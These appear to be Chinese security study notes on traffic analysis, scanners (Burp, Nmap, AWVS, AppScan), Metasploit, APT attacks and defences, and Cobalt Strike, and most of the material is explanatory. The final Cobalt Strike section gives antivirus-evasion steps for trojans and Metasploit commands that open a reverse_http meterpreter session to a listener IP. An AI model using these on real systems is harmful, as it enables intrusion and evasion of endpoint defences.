分析文件（把导出的文件放到云沙箱上进行检测）

根据网络行为分析是否执行成功（查看通信内容）

### 分析TCP握手

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps2.jpg)

源端口表明了发送方的输出端口号。目标端口表示数据包进入接收方的端口号端口对上了，才能正确地将数据包传达。标记用来表示所传输的TCP数据包类型，包括URG、ACK、PSH、RST、SYN和FIN，其中SYN表示同步序号，使用在建立连接时；ACK是确认标志，表示应答域有效，就是前面所说的接收方对请求方的问候表示礼貌致意；FIN表示发送端以及达到数据末尾，此时双方就准备挥手告别了。

### Wireshark解密HTTPS流量

方法1

　从服务器上导出带私钥的P12格式的证书，或者直接导出服务器的私钥。

　　捕获从TCP三次握手开始的完整报文：

此时的报文是被TLS加密的，无法看到具体的报文内容。

　　点击编辑——>首选项——>协议——>SSL（有的版本只有TLS），导入RSA key：

　由于通过DH方法交换的密钥不会在中间传递，所以这种方法只能解密通过RSA交换的密钥。

导入服务器证书：

点击ok后，Wireshark会对捕获的报文进行解密：

报文被成功解密，可以直观的看到HTTP报文的请求和响应。

方法2

通过设置环境变量截取浏览器的pre_master_secret,进而实现解密HTTPS的目的。

　　环境变量中新建用户变量SSLKEYLOGFILE=路径\sslkey.log文件，之后再wireshark中ssl配置中制定该文件位置即可。

　点击编辑>首选项>protocol>ssl：

　即可解密浏览器的访问流量：

### Wireshark解密HTTP流量

1)找疑似后台登入点：http contains login![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps3.jpg)

2）判断登入是否成功，这时可以查看http流的响应情况进行分析：”右键-追踪流-HTTP流”

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps4.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps5.jpg)

可以根据数据流的请求头、请求体判断源IP的一些信息，这个有助于进行追踪；响应头、响应体可以作为本次请求是否成功，达到的响应效果的判断。

HTTP流之外还会有TCP流、UDP流、HTTPS流等，操作的方法是一样的；

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps6.jpg)

### 文件还原

文件-导出对象”这样可以选择导出的协议类型数据，选择http后会出现数据包所有的关于http协议的数据包；在所有http数据流中的文件，选中进行save进行；其他协议相关文件也一样。

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps7.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps8.jpg)

分组字节流还原

对于特定的字节流可以"右键-导出分组字节流”最后保存就ok了

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps9.jpg)

# 工具

### Burpsuite常用的功能是哪几个？

仪表盘（）、漏洞扫描（）、代理（）、测试器（）、重发器（）、定序器（）、编码器（）、对比器（）、插件扩展（）、项目选项（）、用户选项（）

Dashboard（仪表盘）

主要分为三块：Tasks（任务）、Event log（事件日志）、issue activity（动态发现的问题）

Target（目标）

显示目录结构：Site Map、Scope、issue definition

Proxy（代理）

Intercept（拦截）、HTTP History（历史）、WebSockets history、Options

Spider（抓取、爬虫）

Canner（扫描器）

Intruder（入侵）

Target（目标）包含目标主机信息、

Positions（位置）

Attack type 攻击类型:

Sniper:一个字典，两个参数，先匹配第一个参数，再匹配第二个参数

Battering ram:一个字典，两个参数，一个字典同时匹配两个参数，同用户名同密码

Pitchfork:两个字典，两个参数，两个字典分别匹配两个参数，到短的截至

Cluster bomb:两个字典，两个参数，交叉匹配(使用第一个字典的第一项匹配第一个

Repeater（重放器）

Sequencer（定序器）

Decoder（解码器）

Comparer（对比器）

Extender（扩展）

Project options（项目选项）

Options（用户选项）

### MSF是什么？知道怎么使用吗？

简介：

Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程。

模块：

Auxiliary（辅助模块）

为渗透测试信息搜集提供了大量的辅助模块支持

Exploits（攻击模块）

利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。

Payload（攻击载荷模块）

攻击成功后促使靶机运行的一段植入代码

Post （后渗透攻击模块）

收集更多信息或进一步访问被利用的目标系统

Encoders（编码模块）

将攻击载荷进行编码，来绕过防护软件拦截

使用：

首先利用Auxiliary辅助探测模块扫描，嗅探，指纹识别相关漏洞，然后确认漏洞存在使用Exploit漏洞利用模块对漏洞进行利用，包括设置payload攻击载荷，设置本机监听等等。漏洞利用成功目标主机就会通过设置的端口主动连接，产生会话。进而可以进行后渗透。

功能：

木马免杀，抓取用户密码，关闭杀毒软件，屏幕截图，新建账号，远程登录，迁移进程，提权操作，网络嗅探，端口转发 ，内网代理，内网扫描，生成后门，清除日志等等。

### Nmap

iR 随机选择目标 -sV  探测服务/版本信息

-iL 从文件中加载IP地址

-sL 简单的扫描目标

-sn Ping扫描-禁用端口扫描

-Pn 将所有主机视为在在线，跳过主机发现

-sS 使用TCP的SYN进行扫描

-sT 使用TCP进行扫描

-sA 使用TCP的ACK进行扫描

-sU UDP扫描

-sI Idle扫描

-sF FIN扫描

-b<FTP中继主机> FTP反弹扫描

### AWVS

Acunetix Web Vulnerability Scanner（AWVS）可以扫描任何通过 Web 浏览器访问和遵循 HTTP/HTTPS 规则的 Web 站点。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的 Web 网站。

AWVS 可以通过检查 SQL 注入攻击漏洞、XSS 跨站脚本攻击漏洞等漏洞来审核 Web 应用程序的安全性。

#### 工作原理

· 扫描整个网络，通过跟踪站点上的所有链接和 robots.txt 来实现扫描，扫描后 AWVS 就会映射出站点的结构并显示每个文件的细节信息。

· 在上述的发现阶段或者扫描过程之后，AWVS 就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程（用自定义的脚本去探测是否有漏洞） 。WVS 分析每一个页面中需要输入数据的地方，进而尝试 3 所有的输入组合。这是一个自动扫描阶段 。

· 在它发现漏洞之后，AWVS 就会在"Alerts Node(警告节点)”中报告这些漏洞，每一个警告都包含着漏洞信息和如何修补漏洞的建议。

· 在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较，使用报告工具，就可以创建一个专业的报告来总结这次扫描。

#### AWVS 功能及特点

· 自动的客户端脚本分析器，允许对 Ajax 和 Web2.0 应用程序进行安全性测试

· 业内最先进且深入的 SQL 注入和跨站脚本测试

· 高级渗透测试工具，例如 HTPP Editor 和 HTTP Fuzzer

· 可视化宏记录器帮助您轻松测试 web 表格和受密码保护的区域

· 支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证机制

· 丰富的报告功能，包括 VISA PCI 依从性报告

· 高速的多线程扫描器轻松检索成千上万的页面

· 智能爬行程序检测 web 服务器类型和应用程序语言

· Acunetix 检索并分析网站，包括 flash 内容，SOAP 和 AJAX

· 端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查

· 可到处网站漏洞文件

#### AWVS 页面简介

主菜单功能介绍：主菜单共有 5 个模块，分别为 Dashboard、Targets、Vulnerabilities、Scans 和 Reports。

· Dashboard：仪表盘，显示扫描过的网站的漏洞信息

· Targets：目标网站，需要被扫描的网站

· Vulnerabilities：漏洞，显示所有被扫描出来的网站漏洞

· Scans：扫描目标站点，从 Target 里面选择目标站点进行扫描

· Reports：漏洞扫描完成后生成的报告

设置菜单功能介绍：设置菜单共有 8 个模块，分别为 Users、Scan Types、Network Scanner、Issue Trackers、Email Settings、Engines、Excluded Hours、Proxy Settings

· Users：用户，添加网站的使用者、新增用户身份验证、用户登录会话和锁定设置

· Scan Types：扫描类型，可根据需要勾选完全扫描、高风险漏洞、跨站点脚本漏洞、SQL 注入漏洞、弱密码、仅爬网、恶意软件扫描

· Network Scanner：网络扫描仪，配置网络信息包括地址、用户名、密码、端口、协议

· Issue Trackers：问题跟踪器，可配置问题跟踪平台如 github、gitlab、JIRA 等

· Email Settings：邮件设置，配置邮件发送信息

· Engines：引擎，引擎安装删除禁用设置

· Excluded Hours：扫描时间设置，可设置空闲时间扫描

· Proxy Settings：代理设置，设置代理服务器信息

#### 使用 AWVS 扫描网站

· 添加网址，点击 Save

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps10.jpg)

· 进入扫描设置页面，根据项目需求，配置信息，点击 scan 开始扫描

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps11.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps12.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps13.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps14.jpg)

· 设置扫描选项，一般选择全扫，也可以根据你的需求设置扫描类型，设置完成后执行扫描

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps15.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps16.jpg)

· 执行扫描后，自动跳转到仪表板，可以查看扫描过程中发现的漏洞情况

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps17.jpg)

· 点击 Vulnerabilities 进入漏洞列表页面，这里可以导出扫描报告 AWVS 将漏洞分为四级并用红黄蓝绿表示紧急程度，其中红色表示高等、黄色表示中等、蓝色表示低等、绿色表示信息类

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps18.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps19.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps20.jpg)

· 点击选择一个漏洞，点击进入可以看到 AWVS 给出的详细描述 AWVS 给出了漏洞详细描述信息，包括：Vulnerability description（漏洞描述）、Attack Details（攻击详细信息）、HTTP Request （http 请求）、HTTP Response （http 响应）、The impact of this vulnerability（此漏洞的影响）、How to fix this vulnerability（如何修复此漏洞）、Classificationa（分类）、Detailed Information（详细信息）、Web References web（引用）

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps21.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps22.jpg)

Classification 漏洞分类解释

CWE：CommonWeakness Enumeration，是社区开发的常见软件和硬件安全漏洞列表。它是一种通用语言，是安全工具的量尺，并且是弱点识别，缓解和预防工作的基准。

比如下图中 CWE-89 表示的是 这个 bug 是 CWE 列表中第 89 号常见弱点：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps23.jpg)

CVSS： Common Vulnerability Scoring System，即"通用漏洞评分系统”，是一个"行业公开标准，其被设计用来评测漏洞的严重程度，并帮助确定所需反应的紧急度和重要度”。

CVSS 评分系统中规定：漏洞的最终得分最大为 10，最小为 0。得分 7-10 分的漏洞通常被认为比较严重，得分在 4-6.9 分之间的是中级漏洞，0-3.9 分的则是低级漏洞。其中，7~10 分的漏洞都是必须要修复的。

下图展示的是 CVSS 计算指标：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps24.jpg)

· 站点结构 Site Structure 查看每个模块的漏洞情况，便于及时定位问题

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps25.jpg)

#### AWVS 导出报告

· 在 Scans 页面选择报告类型，点击导出

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps26.jpg)

· 在 Reports 页面可选择要下载的报告格式类型，包括 pdf 和 html AWVS 在扫描结束后还可以根据不同要求不同阅读方式，可生成不同类型的报告和细则，然后点击导出报告图标即可导出此次安全扫描报告。

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps27.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps28.jpg)

#### 验证漏洞的真实性

根据针对公司多个项目的扫描，得到了几种常见的漏洞情况，以下是这几种漏洞的验证方法：

##### 4.1 SQL 盲注/SQL 注入

验证方法：利用 sqlmap，GET、POST 方式可以直接 sqlmap -u "url"，cookie SQL 注入新建 txt 文档把请求包大数据复制粘贴到里面，再利用 sqlmap -r "xxx.txt"，查寻是否存在注入点。

##### 4.2 CSRF 跨站伪造请求攻击

CSRF，利用已登录的用户身份，以用户的名义发送恶意请求，完成非法操作。

举例说明：用户如果浏览并信任了存在 CSRF 漏洞的网站 A，浏览器产生了相应的 cookie，用户在没有退出该网站的情况下，访问了危险网站 B 。危险网站 B 要求访问网站 A，发出一个请求。浏览器带着用户的 cookie 信息访问了网站 A，因为网站 A 不知道是用户自身发出的请求还是危险网站 B 发出的请求，所以就会处理危险网站 B 的请求，这样就完成了模拟用户操作的目的。

验证方法：

· 同个浏览器打开两个页面，一个页面权限失效后，另一个页面是否可操作成功，如果仍然能操作成功即存在风险。

· 使用工具发送请求，在 http 请求头中不加入 referer 字段，检验返回消息的应答，应该重新定位到错误界面或者登录界面。

##### 4.3 HTTP 缓慢拒绝服务攻击

HTTP 缓慢拒绝服务攻击是指以极低的速度往服务器发送 HTTP 请求。由于 Web Server 对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么 Web Server 的所有连接都将被恶意连接占用，从而无法接受新的请求，导致拒绝服务。要保持住这个连接，RSnake 构造了一个畸形的 HTTP 请求，准确地说，是一个不完整的 HTTP 请求。

验证方法可参考：[https://www.acunetix.com/vulnerability-scanner/](https://xie.infoq.cn/link?target=https%3A%2F%2Fwww.acunetix.com%2Fvulnerability-scanner%2F)

##### 4.4 源代码泄露

攻击者可以通过分析源代码来收集敏感信息（数据库连接字符串、应用程序逻辑）。此信息可用于进行进一步攻击。

验证方法：在 url 后加/.svn/all-wcprops 或者使用工具 SvnExploit 测试，例如：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps29.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps30.jpg)

##### 4.5 文件信息泄露

开发人员很容易上传一些敏感信息如：邮箱信息、SVN 信息、内部账号及密码、数据库连接信息、服务器配置信息，导致文件信息泄露。

验证方法可参考：[https://www.acunetix.com/vulnerability-scanner/](https://xie.infoq.cn/link?target=https%3A%2F%2Fwww.acunetix.com%2Fvulnerability-scanner%2F)

AWVS 给出的扫描结果并不代表完全真实可靠，还需要依靠人工再次验证判断。在 AWVS 扫描结果基础上，根据不同的严重级别进行排序、手工+工具验证的方式对漏洞验证可靠性，排除误报的情况，并尽可能找出漏报的情况，把本次扫描结果汇总，对以上已验证存在的安全漏洞排列优先级、漏洞威胁程度，并提出每个漏洞的修复建议

#### 生成报告如何导成Excel

AWVS_HTML报告合成Excel工具生成

#### 使用版本

14.9.220713150

#### 功能：

WebScanner ：核心功能，web安全漏洞扫描 (深度，宽度 ，限制20个)

Site Crawler：站点爬行，遍历站点目录结构

Target Finder ：主机发现，找出给定网段中开启了80和443端口的主机

Subdomian Scanner ：子域名扫描器，利用DNS查询

Blind SQL Injector ：盲注工具

Http Editor http：协议数据包编辑器

HTTP Sniffer ： HTTP协议嗅探器 （fiddler，wireshark,bp）

HTTP Fuzzer： 模糊测试工具 (bp)

Authentication Tester ：Web认证破解工具

#### 拓扑词

Acunetix Web Vulnerability Scanner

#### AWVS如何设置只扫描高危漏洞

Targets里设置 配置里设置High Risk High/Medium Risk

### APPSCAN

#### 工作原理

1）通过"探索”功能，利用HTTP Request和Response的内容，爬行出指定网站的整个Web应用结构

2）AppScan本身有一个内置的漏洞扫描的规则库，可随版本进行更新。从探索出的url中，修改参数or目录名等方式，构造不同的url对照组向服务器发送请求or攻击

3）根据HTTP Response返回的内容，和正常请求所返回的响应作对比，是否产生差异性，而这种差异性又是否符合扫描规则库的设定规则，以此来判断是否存在不同类型的安全漏洞

4）若APPScan可判断存在安全漏洞，则对这些漏洞的威胁风险给出说明，进行严重程度提示，并给出修复的建议和方法，以及漏洞发现的位置提示

# APT

## APT攻击

APT攻击（Advanced Persistent Threat，高级持续性威胁）是指组织(特别是政府)或者小团体利用当下先进的攻击手法对特定目标进行长期持续性的网络攻击

APT(高级长期威胁)包含三个要素：高级、长期、威胁。高级强调的是使用复杂精密的恶意软件及技术以利用系统中的漏洞。长期暗指某个外部力量会持续监控特定目标，并从其获取数据。威胁则指人为参与策划的攻击。

APT攻击的原理相对于其他攻击形式更为高级和先进，其高级性主要体现在APT在发动攻击之前需要对攻击对象的业务流程和目标系统进行精确的收集。在此收集的过程中，此攻击会主动挖掘被攻击对象受信系统和应用程序的漏洞，利用这些漏洞组建攻击者所需的网络，并利用0day漏洞进行攻击

## APT攻击手法

APT的攻击手法，在于隐匿自己，针对特定对象，长期、有计划性和组织性地窃取数据，此类攻击行为是传统安全检测系统无法有效检测发现，前沿防御方法是利用非商业化虚拟机分析技术，对各种邮件附件、文件进行深度的动态行为分析，发现利用系统漏洞等高级技术专门构造的恶意文件，从而发现和确认APT攻击行为。由于APT的特性，导致难发现、潜在威胁大，一旦被攻击将导致企业、政府、医疗组织等等的大量数据被窃取，公司重要财务、机密被盗窃。

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps31.jpg)

## APT攻击方式

APT组织常用的攻击手法有：鱼叉式网络钓鱼、水坑攻击、路过式下载攻击、社会工程学、即时通讯工具、社交网络等

## APT的特点

目标 – 威胁的最终目标，即你的对手

时间 – 调查、入侵所花的时间

资源 – 所涉及的知识面及工具（技能和方法也有所影响）

风险承受能力 – 威胁能在多大程度上不被发觉

技能与方法 – 所使用的工具及技术

行动 – 威胁中采取的具体行动

攻击源头 – 攻击来源的数量

牵涉数量 – 牵涉到多少内部或外部系统，多少人的系统具有不同重要性

信息来源 – 是否能通过收集在线信息识别出某个威胁

## APT攻击实现

APT攻击精心策划，精心执行。 它们通常分为四个阶段：入侵，发现，捕获和渗出。 在每个阶段中，可以使用各种技术

## APT常用漏洞

### 1、Office漏洞

Office漏洞依然是大部分APT组织最喜爱的漏洞，Office在个人办公电脑使用量大，对针对性目标是最佳的外网入口，效果也是最直接的。你可能想到了办公套件这类神器，正所谓：最大的漏洞不是存在于任何系统上面，而是人。

### 2、Adobe 系漏洞

Adobe系列包括Adobe Reader、Acrobat、Flash Player，Flash Player因为其跨平台，使用广泛，一直也受到各大APT组织的关注。

### 3、IE漏洞

浏览器是用户接入互联网的门户，IE浏览器是Windows系统的默认浏览器，IE浏览器漏洞的使用一直也受各大组织喜爱。

### 4、防火墙设备漏洞

2016年8月13日客组织ShadowBrokers声称攻破了为NSA开发网络武器的黑客团队Equation Group，并公开其内部使用的相关工具，EXBA-extrabacon工具，该工具基于0-day漏洞CVE-2016-6366，为Cisco防火墙SNMP服务模块的一处缓冲区溢出漏洞

CVE-2016-6366（基于Cisco防火墙SNMP服务模块的一处缓冲区溢出漏洞），目标设备必须配置并启用SNMP协议，同时必须知道SNMP的通信码，漏洞执行之后可关闭防火墙对Telnet/SSH的认证，从而允许攻击者进行未授权的操作。

### 5、SMB通信协议漏洞

EternalBlue工具使用了SMB协议中的三处漏洞，其中主体的越界内存写漏洞隶属于微软MS17-010补丁包中的CVE-2017-0144，通过该集成的工具，攻击者可以直接远程获取漏洞机器的控制权限。

EternalBlue中的核心了漏洞为CVE-2017-0144，该漏洞通过SMB协议的SMB_COM_TRANSACTION2命令触发，当其中的FEALIST字段长度大于10000时将导致内存越界写，由于SMB_COM_TRANSACTION2命令本身FEA LIST的长度最大为FFFF，因此这里就涉及到第二处漏洞，即SMB_COM_TRANSACTION2可被混淆为SMB_COM_NT_TRANSACT，从而实现发送一个FEA LIST字段长度大于10000的SMB_COM_TRANSACTION2命令，实现越界写，最后通过第三个漏洞进行内存布局，最终实现代码执行。

### 6 、OOXML类型混淆漏洞

OOXML是微软公司为Office2007产品开发的技术规范，现已成为国际文档格式标准，兼容前国际标准开放文档格式和中国文档标准"标文通”，Office富文本中本身包含了大量的XML文件，由于设计不当，在对其中的XML文件进行处理的时候，出现了严重的混淆漏洞，最典型的包括CVE-2015-1641，CVE-2017-11826，这里我们选择近年来最流行的OOXML类型混淆漏洞CVE-2015-1641作为典型代表。

### 7 、EPS（EncapsulatedPost Script）脚本解析漏洞

EPS全称EncapsulatedPost Script，属于PostScript的延伸类型，适用于在多平台及高分别率输出设备上进行色彩精确的位图及向量输出，因此在Office中也引进了相应的支持，但是自2015年起多个Office中EPS相关的漏洞被利用，其中包括CVE-2015-2545，CVE-2017-0261，CVE-2017-0262，最终导致微软不得不禁用Office中的EPS组件，而此处我们选择以CVE-2017-0262作为典型代表。

### 8、Windows提权漏洞

在对Office办公软件的EPS（EncapsulatedPost Script）组件进行漏洞攻击的过程中，由于Office 2010及其高版本上的EPS脚本过滤器进程fltldr.exe被保护在低权限沙盒内，要攻破其中的低权限沙盒保护措施，攻击者就必须要使用远程代码执行漏洞配合内核提权漏洞进行组合攻击。所以我们选择Win32k.sys中的本地权限提升漏洞（CVE-2017-0263）这一个配合EPS类型混淆漏洞（CVE-2017-0262）进行组合攻击的提权漏洞作为典型代表。

### 9、iOS三叉戟漏洞

iOS三叉戟漏洞是指针对iOS9.3.5版本之前的iOS系统的一系列0 day漏洞，其利用了3个0 day漏洞，包括一个WebKit漏洞，一个内核地址泄露漏洞和一个提权漏洞。通过组合利用三个0 day漏洞可以实现远程对iOS设备的越狱，并且安装运行任意恶意代码。

## APT防御手段

目前业界比较流行的防御APT思路有三种：

1、采用高级检测技术和关联数据分析来发现APT行为，典型的公司是FireEye；

2、采用数据加密和数据防泄密(DLP)来防止敏感数据外泄，典型的公司是赛门铁克；

3、采用身份认证和用户权限管理技术，严格管控内网对核心数据和业务的访问，典型的公司是RSA。

企业应对防御具体措施：

（1）网络设备和服务

\1. 合理配置边防设备，例如防火墙。具备基本的出入过滤功能，条件允许的实况下使用屏蔽子网结构。防火墙策略按照默认拒绝。如果愿意安装入侵检测系统更好。

\2. 使用有相关安全技术的路由器，例如很多新的路由器有一定的抗ARP攻击的能力。

\3. 善于使用代理服务器（例如反向代理）、web网关（例如一些检测xss的软件）

\4. 内部的办公工作，设计为只有内网用户可以进行。有子公司的情况下，使用VPN技术。

\5. 邮件系统要具有防假冒邮件、防垃圾邮件的基本能力。

\6. 全网内的终端机器，至少使用可靠可更新的安全反病毒软件。

\7. 不必要的情况下，企业内部不要配置公共Wifi。如果需要，限制公共Wifi的权限，使用有效密码，至少使用WPA2的安全设置，条件允许可以隐藏SSID。

\8. 企业内部的通讯使用加密，对抗监听和中间人。

（2）安全管理

\1. 企业建立安全策略，分配职责，雇佣背景清晰的安全工作人员。

\2. 企业制度允许的情况下，合理运用强制休假、岗位轮换的方法。

\3. 企业有一定权限的管理人员（例如人事部门），要合理分权，最小权限，不能集中某一些人都有最高的权限，特别领导同志要主动放弃最高权限。

\4. 入职和离职的时候要仔细检查，例如离职时要有人监督他收拾东西离开，避免最后一刻留下后门，还要及时清除他的账户。使用证书的企业，还要停止他的证书。

\5. 要建立日志审核的制度，有专门的人员审核边防设备记录的重要信息。

\6. 企业架设合理的打卡、门禁制度，作为确定用户的上下班时间，在其不在职时间的奇怪访问，很可能是攻击。

\7. 员工定期清理自己的桌面（不是电脑桌面），目的是确保秘密的文件没有被随意放置。

\8. 员工系统使用强密码，使用要求密码的电脑屏保。

\9. 员工使用的电子设备有基本的防盗能力，至少有锁屏图案，最好有远程数据抹除，如果有全设备加密更好。

\10. 及时更新公司的操作系统到稳定的安全版本，这样可以有效对抗新攻击。特别是web服务器。

\11. 设立一定的监督记录，例如员工不要使用电驴这些可能泄漏敏感信息的内容。

\12. 雇佣有资质的单位，对员工进行安全培训，使员工明白基本的安全知识。

（3）物理安全

\1. 建筑要有一定的防盗设计，例如人造天花板的设计、重要的门有B型以上的锁。

\2. 高度机密的环境下，可以使用电磁屏蔽的技术，一般用于机房。

\3. 雇佣必要的保安人员，设置摄像头。

（4）Web安全

\1. 企业的Web服务器很可能受到攻击，应该配置基本的安全防护软件，尽量使用适当硬化的系统（有条件的情况下配置Linux而不是Windows，并删除不必要的功能和服务）。

\2. 企业的Web应用，如果自身没有安全开发的能力，应该外包给有资质，特别是经济情况正常的企业完成。要避免为了节省费用，使用小家的企业去做。

\3. 内网如果有Web服务（如内部办公，应该和外网适当分离。

\4. 隐藏一些可能泄漏服务器软件类型和版本的信息。

（5）长期的安全维护

\1. 雇佣有能力的、安全底细清楚的安全人员，或者咨询外面的公司。

\2. 定期使用缺陷扫描仪、端口扫描仪等等进行检查。

\3. 有条件的企业，应该配置蜜罐或者蜜网。

\4. 建立安全基准，有助于识别未知的安全攻击

# CS

## CS 特证码

```
1、默认端口是 50050 

2、请求的 url 为/jquery-3.3.1.min.js，返回包的大小为 5543 

3、在流量包中可以从域名/IP、指令长度（心跳长度默认5秒）、指令结果长度（返回结果包长度）、指令执行时间（POST 包与指令包时间间隔）

4、cookie有一串固定的加密值
```

## CS是什么东西，知道怎么使用吗？

简介

CobaltStrike是一款渗透测试工具，被业界人称为CS。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可用于团队分布式协同操作。

功能

CobaltStrike 集成了端口转发，服务扫描，自动化溢出，多模式端口监听，windows exe 木 马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击等功能。

使用

一般使用步骤就是，先启动服务端，然后启动客户端连接获得一个可视化的界面，新建监听器来接收会话，生成木马文件(常见.exe可执行文件，office宏病毒，html应用程序类型的后门文件)，上传到受害者主机，当受害者运行该木马文件时目标主机就在CS上线了。

## CS码除了在windows上，是否可以在Linux、MacOS上跑

客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。启动Cobalt Strike客户端，输入服务端的IP以及端口、连接密码，用户名可以任意设置。

这里windows需要java 8jdk，Linux需要10jdk、mac一样。

## 域前置技术是什么？

域前置技术就是通过CDN节点将流量转发到真实的C2服务器，其中CDN节点ip通过识别请求的Host头进行流量转发。

利用阿里云全站加速CDN实现任意HOST头修改，利用构造高信誉域名，从而实现绕过流量分析。

## 域前置溯源思路

### 空间资产测绘进行域前置溯源

因为forbidden.com是用的CDN服务回源恶意ip，forbidden.com必定暴露在公网上。

既然在公网上存在，就必定会被空间资产测绘所检测到，通过对比测绘的界面和从CDN端返回的数据包进行对比，从而缩小范围，直至定位到具体地址。

### 逆向木马样本

forbidden.com一定会写在木马样本的代码里面，需要通过逆向工程，将木马样本进行逆向，读出其执行的代码，不过木马一般都会做免杀操作，可能是编码、加密过后的，需要一步一步逆向解码

## 域前置的通信流程为

client端向DNS服务器请求allow.com网址的ip地址（因为做了CDN，所以返回的是CDN的地址）

数据包解析到CDN上面，请求到forbidden.com的回源地址（真正的server端）

server端将数据返回CDN服务器

CDN将数据返回client端

## 疑难问题

安全监测设备看到的请求包的host是什么？ allow.com

为什么请求包只能看到allow.com？ https协议是将http协议的数据包进行公钥加密后的，client端只用公钥，只能加密，无法做解密操作

为什么CDN知道解析forbidden.com的回源地址？ 公钥加密的私钥在CDN端，CDN服务器可以对https协议的包进行解密，看到里面写的是请求的forbidden.com

allow.com和forbidden.com有什么关系？这两个网站要挂在同一个CDN下，目前主流的云厂商，提供CDN服务均要认证域名归属和备案。如果是在腾讯云、阿里云等厂商的CDN服务器，这两个网站的归属即为同一单位/人。也有一些小CDN提供商不做认证，这两个网址可能不是同一归属了

## CS免杀木马生成

http://bypass.tidesec.com/web/ 潮影在线免杀平台

先启动服务端，然后启动客户端连接获得一个可视化的界面，新建监听器来接收会话，生成木马文件

把CS文件上传到Kali上运行./teaserver ip 密码

然后使用CS客户端连接即可，输入对应IP、端口和密码。

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps32.jpg)

Cobaltstrike生成木马

首先创建监听器

攻击-》生成后门-》windows executable,选择监听点击保存即可生成木马

木马进行免杀（通过修改特征码、花指令免杀、加壳免杀、内存免杀、二次编译、分离免杀、资源修改）

————资源修改+加壳组合免杀 bypass杀软（打开应用Restorator，拖进木马和网易云，把网易云所有资源都复制到木马上，点击保存。通过Safengine Shielden工具再对这个木马进行加壳，检测选项基本都勾上然后点击保护 ）绕过360和火绒

（修改特征码，可以根据污点检测的方式定位到触发杀软规则的病毒样本特征，修改明显的特征在一定程度上是可以实现免杀的。

•花指令免杀，在程序 shellcode 或特征代码区域增添垃圾指令，增加的垃圾指令不会影响文件执行，在动态查杀或者文件hash对比是校验会不一致。

（shell code 的核心就是把代码写成 "与地址无关” 的风格，让它不论是在什么环境下都可以被执行）

•加壳，比如upx加壳等，一般文件落地后对比哈希值也可绕过杀软。

•二次编译，一般用于对shellcode进行二次编译bypass杀软。

•poweshell免杀，但是一般防护软件或者系统本身正常调用powershell应用程序的时候都会产生告警，一般的安全设备是过不了的，需要在命令上使用手段绕过安全设备监测。

## Cobalt strike 向Msf传递会话

再配置一个监听器，设置模块为Foreign HTTP

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps33.jpg)

配置好后在上线的主机上右击Spawn（增加会话），选择Foreign HTTP监听模块，

这时候msf监听那边就会接收到会话

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps34.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps35.jpg)

## Msf派生shell给Cobaltstrike

新建一个监听器，设置模块为beacon HTTP

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps36.jpg)

接下来把kali上获得的meterpreter会话转发到cobaltstrike主机上，

这里我们需要用到一个exploit模块：

\1. exploit/windows/local/payload_inject

\2. set payload windows/meterpreter/reverse_http

\3. set DisablePayloadHandler true

\4. set lhost 192.168.43.147

\5. set lport 8081

\6. set session 4

\7. run

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps37.jpg)

这时候返回客户端可以发现已经返回一个名为CS的会话

